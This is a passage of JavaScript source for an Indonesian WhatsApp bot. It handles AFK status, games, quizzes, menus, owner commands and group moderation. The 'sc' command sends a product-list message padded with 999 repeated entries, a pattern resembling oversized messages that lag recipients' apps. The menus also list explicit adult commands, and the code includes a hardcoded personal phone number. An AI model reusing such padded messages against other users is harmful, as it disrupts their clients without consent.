	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
	    
        switch(command) {
        	case 'req': case 'request':{
        	g = `6281316701742@s.whatsapp.net`
        satria.sendText(g, `New Request : ${q}\n\nRequest ,: ${m.sender}`, m)
        m.reply('Thank you for making a request')
        }
        break
        case 'report': case 'lapor':{
        g = `6281316701742@s.whatsapp.net`
        satria.sendText(g, `New Report : ${q}\n\nReport From : ${m.sender}`, m)
        m.reply('Reports sent, if playing games will not be responded to, you will be blocked by bots.')
        }
        break
	    case 'afk':{
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break	
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await satria.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await satria.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            satria.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await satria.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) satria.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'sc': {
                let arr = []
for (let i = 0; i < 999; i++) arr.push({ productId: '5027155267411425' }) 
	let prep = generateWAMessageFromContent(m.chat, {
	listMessage: {
		title: 'Script Bot', description: ucapanWaktu,
		buttonText: 'Buy', listType: 2,
		sections: [], productListInfo: {
			productSections: [{ title: 'github: SatzzBotzz', products: arr }],
			headerImage: {
				productId: '5027155267411425', jpegThumbnail: thumb
			},
			businessOwnerJid: '6281316701742@s.whatsapp.net'
		},
		footerText: botname,
		contextInfo: null 
	}
}, {})

satria.relayMessage(m.chat, prep.message, { messageId: prep.key.id })
}
            break

case 'mn1': {
freplyy(`╭─❒ 「 Group Menu 」
 ├ ${prefix}linkgroup
 ├ ${prefix}ephemeral [option]
 ├ ${prefix}setppgc [image]
 ├ ${prefix}setname [text]
 ├ ${prefix}setdesc [text]
 ├ ${prefix}group [option]
 ├ ${prefix}editinfo [option]
 ├ ${prefix}add @user
 ├ ${prefix}kick @user
 ├ ${prefix} chat @user
 ├ ${prefix}hidetag [text]
 ├ ${prefix}tagall [text]
 ├ ${prefix}antilink [on/off]
 ├ ${prefix}mute [on/off]
 ├ ${prefix}promote @user
 ├ ${prefix}demote @user
 ├ ${prefix}vote [text]
 ├ ${prefix}devote
 ├ ${prefix}upvote
 ├ ${prefix}cekvote
 ├ ${prefix}hapusvote
 ╰❒`)
}
break
case 'mn2': {
freplyy(` ╭─❒ 「 Main Menu 」
 ├ ${prefix}ping
 ├ ${prefix}request
 ├ ${prefix}report
 ├ ${prefix}owner
 ├ ${prefix}menu
 ├ ${prefix}help
 ├ ${prefix}delete
 ├ ${prefix}infochat
 ├ ${prefix}quoted
 ├ ${prefix}listpc
 ├ ${prefix}listgc
 ├ ${prefix}listonline
 ├ ${prefix}speedtest
 ╰❒`)
}
break
case 'mn3': {
freplyy(` ╭─❒ 「 Owner Menu 」
 ├ ${prefix}react [emoji]
 ├ ${prefix}chat [option]
 ├ ${prefix}join [link]
 ├ ${prefix}leave
 ├ ${prefix}block @user
 ├ ${prefix}unblock @user
 ├ ${prefix}bcgroup [text]
 ├ ${prefix}bcall [text]
 ├ ${prefix}setppbot [image]
 ├ ${prefix}setexif
 ├ ${prefix}setmenu [option]
 ╰❒`)
}
break
case 'mn4': {
freplyy(` ╭─❒ 「 Webzone Menu 」
 ├ ${prefix}playstore
 ├ ${prefix}gsmarena
 ├ ${prefix}jadwalbioskop
 ├ ${prefix}nowplayingbioskop
 ├ ${prefix}aminio
 ├ ${prefix}wattpad
 ├ ${prefix}webtoons
 ├ ${prefix}drakor
 ╰❒`)
}
break
case 'mn5': {
freplyy(` ╭─❒ 「 Downloader Menu 」
 ├ ${prefix}tiktoknowm [url]
 ├ ${prefix}tiktokwm [url]
 ├ ${prefix}tiktokmp3 [url]
 ├ ${prefix}instagram [url]
 ├ ${prefix}twitter [url]
 ├ ${prefix}twittermp3 [url]
 ├ ${prefix}facebook [url]
 ├ ${prefix}pinterestdl [url]
 ├ ${prefix}ytmp3 [url]
 ├ ${prefix}ytmp4 [url]
 ├ ${prefix}getmusic [query]
 ├ ${prefix}getvideo [query]
 ├ ${prefix}umma [url]
 ├ ${prefix}joox [query]
 ├ ${prefix}soundcloud [url]
 ╰❒`)
}
break
case 'mn6': {
freplyy(` ╭─❒ 「 Search Menu 」
 ├ ${prefix}play [query]
 ├ ${prefix}yts [query]
 ├ ${prefix}google [query]
 ├ ${prefix}gimage [query]
 ├ ${prefix}pinterest [query]
 ├ ${prefix}wallpaper [query]
 ├ ${prefix}wikimedia [query]
 ├ ${prefix}ytsearch [query]
 ├ ${prefix}ringtone [query]
 ├ ${prefix}stalk [option] [query]
 ╰❒`)
}
break
case 'mn7': {
freplyy(` ╭─❒ 「 Random Menu 」
 ├ ${prefix}chat
 ├ ${prefix}stopwatch
 ├ ${prefix}nekopoi
 ├ ${prefix}wamod
 ├ ${prefix}coffe
 ├ ${prefix}quotesanime
 ├ ${prefix}motivasi
 ├ ${prefix}dilanquote
 ├ ${prefix}bucinquote
 ├ ${prefix}katasenja
 ├ ${prefix}puisi
 ├ ${prefix}couple
 ├ ${prefix}anime
 ├ ${prefix}waifu
 ├ ${prefix}husbu
 ├ ${prefix}neko
 ├ ${prefix}shinobu
 ├ ${prefix}waifus (nsfw)
 ├ ${prefix}nekos (nsfw)
 ├ ${prefix}trap (nsfw)
 ├ ${prefix}blowjob (nsfw)
 ╰❒`)
}
break
case 'mn8': {
freplyy(` ╭─❒ 「 Textpro Menu 」
 ├ ${prefix}3dchristmas
 ├ ${prefix}3ddeepsea
 ├ ${prefix}americanflag
 ├ ${prefix}3dscifi
 ├ ${prefix}3drainbow
 ├ ${prefix}3dwaterpipe
 ├ ${prefix}halloweenskeleton
 ├ ${prefix}sketch
 ├ ${prefix}bluecircuit
 ├ ${prefix}space
 ├ ${prefix}metallic
 ├ ${prefix}fiction
 ├ ${prefix}greenhorror
 ├ ${prefix}transformer
 ├ ${prefix}berry
 ├ ${prefix}thunder
 ├ ${prefix}magma
 ├ ${prefix}3dcrackedstone
 ├ ${prefix}3dneonlight
 ├ ${prefix}impressiveglitch
 ├ ${prefix}naturalleaves
 ├ ${prefix}fireworksparkle
 ├ ${prefix}matrix
 ├ ${prefix}dropwater
 ├ ${prefix}harrypotter
 ├ ${prefix}foggywindow
 ├ ${prefix}neondevils
 ├ ${prefix}christmasholiday
 ├ ${prefix}3dgradient
 ├ ${prefix}blackpink
 ├ ${prefix}gluetext
 ╰❒`)
}
break
case 'mn9': {
freplyy(` ╭─❒ 「 Photo Oxy Menu 」
 ├ ${prefix}shadow
 ├ ${prefix}romantic
 ├ ${prefix}smoke
 ├ ${prefix}burnpapper
 ├ ${prefix}naruto
 ├ ${prefix}lovemsg
 ├ ${prefix}grassmsg
 ├ ${prefix}lovetext
 ├ ${prefix}coffecup
 ├ ${prefix}butterfly
 ├ ${prefix}harrypotter
 ├ ${prefix}retrolol
 ╰❒`)
}
break
case 'mn10': {
freplyy(` ╭─❒ 「 Ephoto Menu 」
 ├ ${prefix}ffcover
 ├ ${prefix}crossfire
 ├ ${prefix}galaxy
 ├ ${prefix}glass
 ├ ${prefix}neon
 ├ ${prefix}beach
 ├ ${prefix}blackpink
 ├ ${prefix}igcertificate
 ├ ${prefix}ytcertificate
 ╰❒`)
}
break
case 'mn11': {
freplyy(` ╭─❒ 「 Fun Menu 」
 ├ ${prefix}simih
 ├ ${prefix}halah
 ├ ${prefix}hilih
 ├ ${prefix}huluh
 ├ ${prefix}heleh
 ├ ${prefix}holoh
 ├ ${prefix}jadian
 ├ ${prefix}jodohku
 ├ ${prefix}delttt
 ├ ${prefix}tictactoe
 ├ ${prefix}family100
 ├ ${prefix}tebak [option]
 ├ ${prefix}math [mode]
 ├ ${prefix}suitpvp [@tag]
 ╰❒ `)
}
break
case 'mn12': {
freplyy(` ╭─❒ 「 Primbon Menu 」
 ├ ${prefix}nomorhoki
 ├ ${prefix}artimimpi
 ├ ${prefix}artinama
 ├ ${prefix}ramaljodoh
 ├ ${prefix}ramaljodohbali
 ├ ${prefix}suamiistri
 ├ ${prefix}ramalcinta
 ├ ${prefix}cocoknama
 ├ ${prefix}pasangan
 ├ ${prefix}jadiannikah
 ├ ${prefix}sifatusaha
 ├ ${prefix}rezeki
 ├ ${prefix}pekerjaan
 ├ ${prefix}nasib
 ├ ${prefix}penyakit
 ├ ${prefix}tarot
 ├ ${prefix}fengshui
 ├ ${prefix}haribaik
 ├ ${prefix}harisangar
 ├ ${prefix}harisial
 ├ ${prefix}nagahari
 ├ ${prefix}arahrezeki
 ├ ${prefix}peruntungan
 ├ ${prefix}weton
 ├ ${prefix}karakter
 ├ ${prefix}keberuntungan
 ├ ${prefix}memancing
 ├ ${prefix}masasubur
 ├ ${prefix}zodiak
 ├ ${prefix}shio
 ╰❒`)
}
break
case 'mn13': {
freplyy(` ╭─❒ 「 Convert Menu 」
 ├ ${prefix}attp
 ├ ${prefix}ttp
 ├ ${prefix}toimage
 ├ ${prefix}removebg
 ├ ${prefix}sticker
 ├ ${prefix}emojimix
 ├ ${prefix}emojimix2
 ├ ${prefix}tovideo
 ├ ${prefix}togif
 ├ ${prefix}tourl
 ├ ${prefix}tovn
 ├ ${prefix}tomp3
 ├ ${prefix}toaudio
 ├ ${prefix}ebinary
 ├ ${prefix}dbinary
 ├ ${prefix}styletext
 ├ ${prefix}smeme`)
}
break
case 'mn14': {
freplyy(` ╭─❒ 「 Database Menu 」
 ├ ${prefix}setcmd
 ├ ${prefix}listcmd
 ├ ${prefix}delcmd
 ├ ${prefix}lockcmd
 ├ ${prefix}addmsg
 ├ ${prefix}listmsg
 ├ ${prefix}getmsg
 ├ ${prefix}delmsg
 ╰❒`)
}
break
case 'mn15': {
freplyy(` ╭─❒ 「 Anonymous Menu 」
 ├ ${prefix}anonymous
 ├ ${prefix}start
 ├ ${prefix}next
 ├ ${prefix}keluar
 ╰❒`)
}
break
case 'mn16': {
freplyy(` ╭─❒ 「 Islamic Menu 」
 ├ ${prefix}iqra
 ├ ${prefix}hadist
 ├ ${prefix}alquran
 ├ ${prefix}juzamma
 ├ ${prefix}tafsirsurah
 ╰❒`)
}
break
case 'mn17': {
freplyy(` ╭─❒ 「 Voice Changer Menu 」
 ├ ${prefix}bass
 ├ ${prefix}blown
 ├ ${prefix}deep
 ├ ${prefix}earrape
 ├ ${prefix}fast
 ├ ${prefix}fat
 ├ ${prefix}nightcore
 ├ ${prefix}reverse
 ├ ${prefix}robot
 ├ ${prefix}slow
 ├ ${prefix}tupai
 ╰❒ `)
}
break
            case 'chatedit': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    satria.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    satria.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    satria.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    satria.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    satria.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    satria.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    satria.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await satria.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await satria.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: fdoc })
                    satria.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    satria.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, global.footer, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    satria.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    satria.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, global.footer, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    satria.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    satria.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, global.footer, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    satria.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    satria.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, global.footer, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    satria.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    satria.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, global.footer, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    satria.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    satria.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, global.footer, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nExamples of use : ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                satria.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, jawab, global.footer, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, jawab, global.footer, m, {mentions: menst})
            }
            break
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                satria.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await satria.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await satria.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await satria.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await satria.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await satria.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await satria.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await satria.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await satria.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'ban': case 'banned':{
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		global.db.data.users[users].banned = true
		await m.reply(`Success Banned @users`)
	}
	break
	case 'unban': case 'unsuspend':{
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		global.db.data.users[users].banned = false
		await m.reply(`Success Unbanned @users`)
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await satria.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await satria.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (args[0] === 'full') {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
